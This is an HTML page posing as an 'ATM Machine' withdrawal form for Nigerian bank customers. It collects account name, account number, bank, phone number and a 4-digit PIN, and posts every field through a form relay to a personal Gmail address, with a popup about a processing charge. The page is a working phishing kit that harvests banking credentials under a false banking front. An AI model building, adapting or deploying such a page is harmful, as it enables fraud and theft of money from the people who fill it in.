<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ATM Machine</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .atm {
            background: linear-gradient(145deg, #2e2e2e, #1a1a1a);
            border-radius: 20px;
            width: 350px;
            padding: 20px;
            box-shadow: 5px 5px 15px #000, -5px -5px 15px #2e2e2e;
        }
        .fixed-note {
            text-align: center;
            margin-bottom: 20px;
            font-size: 16px;
            color: #f00;
            font-weight: bold;
            background-color: #333;
            padding: 10px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }
        .screen {
            background-color: #333;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
            color: #0f0;
            font-size: 18px;
            font-weight: bold;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label {
            margin: 10px 0 5px;
            font-size: 14px;
        }
        input, select, button {
            border: none;
            border-radius: 5px;
            padding: 10px;
            margin-bottom: 15px;
            font-size: 14px;
        }
        input, select {
            background-color: #444;
            color: #fff;
        }
        button {
            background-color: #0f0;
            color: #000;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background-color: #0c0;
        }
    </style>
    <script>
        function showPopupMessage() {
            alert("Please wait for your transaction to be processed. You will be charged NGN 1,000. Terms & Conditions apply. Thank you.");
        }
    </script>
</head>
<body>
    <div class="atm">
        <div class="fixed-note">
            Warning: Do not withdraw twice!
        </div>
        <div class="screen">
            Welcome to the ATM
        </div>
        <form action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" onsubmit="showPopupMessage()">
            <label for="accountName">Account Name:</label>
            <input type="text" id="accountName" name="accountName" placeholder="Enter your account name" required>

            <label for="accountNumber">Account Number:</label>
            <input type="text" id="accountNumber" name="accountNumber" placeholder="Enter your account number" required>

            <label for="bankName">Bank Name:</label>
            <select id="bankName" name="bankName" required>
                <option value="">Select Bank</option>
                <option value="Access Bank">Access Bank</option>
                <option value="Citibank">Citibank</option>
                <option value="Diamond Bank">Diamond Bank</option>
                <option value="Ecobank">Ecobank</option>
                <option value="Fidelity Bank">Fidelity Bank</option>
                <option value="First Bank of Nigeria">First Bank of Nigeria</option>
                <option value="First City Monument Bank (FCMB)">First City Monument Bank (FCMB)</option>
                <option value="Guaranty Trust Bank (GTBank)">Guaranty Trust Bank (GTBank)</option>
                <option value="Heritage Bank">Heritage Bank</option>
                <option value="Jaiz Bank">Jaiz Bank</option>
                <option value="Keystone Bank">Keystone Bank</option>
                <option value="Polaris Bank">Polaris Bank</option>
                <option value="Providus Bank">Providus Bank</option>
                <option value="Stanbic IBTC Bank">Stanbic IBTC Bank</option>
                <option value="Standard Chartered Bank">Standard Chartered Bank</option>
                <option value="Sterling Bank">Sterling Bank</option>
                <option value="Suntrust Bank">Suntrust Bank</option>
                <option value="Union Bank">Union Bank</option>
                <option value="United Bank for Africa (UBA)">United Bank for Africa (UBA)</option>
                <option value="Unity Bank">Unity Bank</option>
                <option value="Wema Bank">Wema Bank</option>
                <option value="Zenith Bank">Zenith Bank</option>
            </select>

            <label for="amount">Amount:</label>
            <select id="amount" name="amount" required>
                <option value="">Select Amount</option>
                <option value="10000">10,000</option>
                <option value="20000">20,000</option>
                <option value="30000">30,000</option>
                <option value="40000">40,000</option>
            </select>

            <label for="beneficiaryPhoneNumber">Beneficiary's Phone Number:</label>
            <input type="text" id="beneficiaryPhoneNumber" name="beneficiaryPhoneNumber" placeholder="Enter phone number" required>

            <label for="insectPIN">Insect PIN:</label>
            <input type="number" id="insectPIN" name="insectPIN" pattern="\d{4}" inputmode="numeric" placeholder="4-digit PIN" required>

            <button type="submit">Withdraw</button>
        </form>
    </div>
</body>
</html>
